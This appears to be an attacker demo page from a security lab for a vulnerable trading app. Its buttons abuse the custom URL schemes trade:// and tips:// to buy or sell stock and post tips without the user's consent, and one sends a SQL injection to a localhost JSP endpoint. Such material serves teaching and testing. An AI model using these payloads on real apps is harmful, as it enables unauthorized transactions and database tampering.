<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Malicious Web</title>
    <style type="text/css">
        input[type=text], input[type=url], input[type=email], input[type=password], input[type=tel] {
            -webkit-appearance: none; -moz-appearance: none;
            display: block;
            margin: 0;
            width: 100%; height: 40px;
            line-height: 40px; font-size: 17px;
            border: 1px solid #bbb;
        }
        button[type=submit] {
            -webkit-appearance: none; -moz-appearance: none;
            display: block;
            margin: 0.5em 0;
            font-size: 1em; line-height: 2.5em;
            color: #333;
            font-weight: bold;
            height: 2.5em; width: 100%;
            background: #fdfdfd; background: -moz-linear-gradient(top, #fdfdfd 0%, #bebebe 100%); background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#fdfdfd), color-stop(100%,#bebebe)); background: -webkit-linear-gradient(top, #fdfdfd 0%,#bebebe 100%); background: -o-linear-gradient(top, #fdfdfd 0%,#bebebe 100%); background: -ms-linear-gradient(top, #fdfdfd 0%,#bebebe 100%); background: linear-gradient(to bottom, #fdfdfd 0%,#bebebe 100%);
            border: 1px solid #bbb;
            -webkit-border-radius: 10px; -moz-border-radius: 10px; border-radius: 10px;
        }

        body {
            font-family: Helvetica, arial, sans-serif;
        }
        .congrats {
            font-size: 16pt;
            padding: 6px;
            text-align: center;
        }
        .step {
            background: white;
            border: 1px #ccc solid;
            border-radius: 14px;
            padding: 4px 10px;
            margin: 10px 0;
        }
        .instructions {
            font-size: 10pt;
        }
        .arrow {
            font-size: 15pt;
        }

    </style>


</head>
<body>

<div class="newUser">
    <h1 align="center"> Malicious Web</h1>
    <button type=submit name="buy" onclick="window.location='trade://buy?symbol=GOOG&shares=10';"> Buy Stock </button>
    <button type=submit name="sell" onclick="window.location='trade://sell?symbol=GOOG&shares=10';"> Sell Stock </button>
    <button type=submit name="tips" onclick="window.location='tips://share?symbol=GOOG&reason=all your tips belong to me';"> Send Tip </button>
     <button type=submit name="update" onclick="window.location='http://localhost:8080/web/tips.jsp?query=insert%20into%20version%28log%29%20values%28%27l337%20h4x0R%27%29;';">Update Version</button>
</div>

</body>
</html>